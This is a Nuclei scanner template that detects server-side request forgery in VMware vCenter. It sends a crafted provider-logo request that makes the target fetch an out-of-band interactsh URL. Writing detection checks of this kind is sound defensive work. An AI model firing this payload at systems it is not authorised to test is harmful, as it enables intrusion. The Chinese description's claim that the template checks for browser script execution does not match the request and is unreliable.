id: vmware-vcenter-ssrf

info:
  name: VMware vCenter - 服务端请求伪造漏洞
  author: pdteam
  severity: critical
  description: VMware vCenter - Server-Side Request Forgery/本地文件包含/跨站脚本 存在服务端请求伪造漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  reference:
    - https://github.com/l0ggg/VMware_vCenter
  classification:
    cwe-id: CWE-918
  metadata:
    max-request: 1
  tags: ssrf,lfi,xss,oast,vcenter,vmware,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: interactsh_request
        words:
          - "User-Agent: Java"
